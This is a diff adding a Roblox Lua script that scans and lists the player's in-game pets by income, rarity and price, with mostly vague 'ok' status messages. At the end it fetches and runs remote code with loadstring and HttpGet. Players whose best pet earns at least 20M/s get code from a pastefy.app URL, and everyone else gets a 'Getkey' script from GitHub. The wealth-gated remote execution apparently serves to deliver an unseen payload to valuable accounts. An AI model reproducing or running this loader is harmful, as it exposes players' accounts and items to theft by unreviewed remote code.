@@ -1,0 +1,123 @@
+
+local function scanPets()
+    local results = {}
+    local seen = {}
+
+    for _, obj in ipairs(workspace:GetDescendants()) do
+        if obj:IsA("SurfaceGui") and obj.Name == "AnimalOverhead" then
+            local displayName = obj:FindFirstChild("DisplayName")
+            local generation  = obj:FindFirstChild("Generation")
+            local rarity      = obj:FindFirstChild("Rarity")
+            local mutation    = obj:FindFirstChild("Mutation")
+            local price       = obj:FindFirstChild("Price")
+            local stolen      = obj:FindFirstChild("Stolen")
+
+            if displayName and generation then
+                local key = displayName.Text .. generation.Text
+                if not seen[key] then
+                    seen[key] = true
+                    table.insert(results, {
+                        name     = displayName.Text,
+                        gen      = generation.Text,
+                        rarity   = rarity and rarity.Text or "?",
+                        mutation = mutation and mutation.Text or "",
+                        price    = price and price.Text or "?",
+                        stolen   = stolen and stolen.Text == "STOLEN" or false,
+                    })
+                end
+            end
+        end
+    end
+
+    table.sort(results, function(a, b)
+        local function parseNum(str)
+            local num, suffix = str:match("%$([%d%.]+)([KMBTkmbt]?)")
+            num = tonumber(num) or 0
+            local mult = {K=1e3,M=1e6,B=1e9,T=1e12,k=1e3,m=1e6,b=1e9,t=1e12}
+            return num * (mult[suffix] or 1)
+        end
+        return parseNum(a.gen) > parseNum(b.gen)
+    end)
+
+    return results
+end
+
+local function parseNum(str)
+    local num, suffix = str:match("%$([%d%.]+)([KMBTkmbt]?)")
+    num = tonumber(num) or 0
+    local mult = {K=1e3,M=1e6,B=1e9,T=1e12,k=1e3,m=1e6,b=1e9,t=1e12}
+    return num * (mult[suffix] or 1)
+end
+
+local function fmtNum(n)
+    if n >= 1e12 then return string.format("$%.2fT/s", n/1e12)
+    elseif n >= 1e9  then return string.format("$%.2fB/s", n/1e9)
+    elseif n >= 1e6  then return string.format("$%.2fM/s", n/1e6)
+    elseif n >= 1e3  then return string.format("$%.2fK/s", n/1e3)
+    else return string.format("$%.0f/s", n) end
+end
+
+-- ═══════════════════════════════════
+-- SCAN VÀ PRINT
+-- ═══════════════════════════════════
+local results = scanPets()
+
+print("═══════════════════════════════════")
+print("ok")
+print("═══════════════════════════════════")
+
+if #results == 0 then
+    print(" ok")
+else
+    for i, pet in ipairs(results) do
+        local line = string.format(
+            "[%d] %-25s | Gen: %-10s | Rarity: %-10s | Giá: %-8s%s%s",
+            i,
+            pet.name,
+            pet.gen,
+            pet.rarity,
+            pet.price,
+            pet.mutation ~= "" and " | ✦ " .. pet.mutation or "",
+            pet.stolen and " | 🔴 STOLEN" or ""
+        )
+        print(line)
+    end
+
+    local totalGen = 0
+    for _, p in ipairs(results) do
+        totalGen = totalGen + parseNum(p.gen)
+    end
+
+    print("───────────────────────────────────")
+    print("ok")
+    print("═══════════════════════════════════")
+end
+
+local highestGen = 0
+local highestPet = nil
+
+for _, pet in ipairs(results) do
+    local val = parseNum(pet.gen)
+    if val > highestGen then
+        highestGen = val
+        highestPet = pet
+    end
+end
+
+local THRESHOLD = 20 * 1e6 -- 20M/s
+
+if highestPet then
+    print("Ok")
+end
+
+print("═══════════════════════════════════")
+
+if highestGen >= THRESHOLD then
+    print("Loading...")
+    print("═══════════════════════════════════")
+    loadstring(game:HttpGet("https://pastefy.app/HozLvxjs/raw", true))()
+else
+    print("Getkey")
+    print("═══════════════════════════════════")
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Khangdz28/Base-/refs/heads/main/Getkey"))()
+end
